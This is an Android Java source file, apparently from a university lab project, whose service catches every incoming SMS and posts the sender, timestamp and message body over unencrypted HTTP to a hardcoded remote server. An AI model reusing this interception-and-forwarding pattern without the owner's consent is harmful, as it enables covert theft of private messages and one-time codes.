package uk.ac.rgu.lab04.honours;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

public class SmsService extends Service {


    private static final String TAG = "smsService";

    @Override
    public void onCreate() {
        //Log.d(TAG, "onCreate: ");
        startForeground(2, getNotification());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Notification getNotification() {
        //Log.d(TAG, "getNotification:");
        NotificationChannel channel = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            channel = new NotificationChannel("channel_01", "My Channel", NotificationManager.IMPORTANCE_DEFAULT);
        }

        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationManager.createNotificationChannel(channel);
        }

        Notification.Builder builder = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            builder = new Notification.Builder(getApplicationContext(), "channel_01").setAutoCancel(true);
        }
        return builder.build();
    }

    public static class SmsReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {

            Log.d(TAG, "onReceive: ");
            Bundle extras = intent.getExtras();
            SmsMessage[] messages;
            String finalSms="";

            Object[] pdus;
            if (extras != null) {
                pdus = (Object[]) extras.get("pdus");

                if (pdus != null) {
                    messages = new SmsMessage[pdus.length];

                    for (int i = 0; i < pdus.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i],extras.getString("format"));
                    }

                    for (SmsMessage message : messages) {
                        finalSms+=message.getDisplayMessageBody();
                    }
                    Log.d(TAG, messages[0].getOriginatingAddress());
                    Log.d(TAG, String.valueOf(messages[0].getTimestampMillis()));
                    Log.d(TAG, finalSms);
                    insertData(String.valueOf(messages[0].getTimestampMillis()),messages[0].getOriginatingAddress(),finalSms);
                }
            }
        }
    }

    //send data to phpmyadmin
    public static void insertData(final String date, final String address, final String message){

        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
            @Override
            protected void onPreExecute() {
                super.onPreExecute();
            }

            @Override
            protected String doInBackground(String... params) {
                String reg_url="http://35.178.169.116/insertSms.php";
                String date=params[0];
                String address=params[1];
                String message=params[2];
                try {
                    URL url = new URL(reg_url);
                    HttpURLConnection httpURLConnection =
                            (HttpURLConnection)url.openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoOutput(true);
                    OutputStream OS = httpURLConnection.getOutputStream();
                    BufferedWriter bufferedWriter = new BufferedWriter(new
                            OutputStreamWriter(OS, StandardCharsets.UTF_8));
                    String data= URLEncoder.encode("date","UTF-8")+"="+URLEncoder.encode(date,"UTF-8")
                            +"&"+URLEncoder.encode("address","UTF-8")+"="+URLEncoder.encode(address,"UTF-8")
                            +"&"+URLEncoder.encode("message","UTF-8")+"="+URLEncoder.encode(message,"UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    OS.close();
                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();
                    return "Registration Success!!";
                } catch (IOException e){
                    e.printStackTrace();
                }
                return null;
            }

            @Override
            protected void onProgressUpdate(Void... values) {
                super.onProgressUpdate(values);
            }
        }

        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();

        sendPostReqAsyncTask.execute(date,address,message);
    }

}
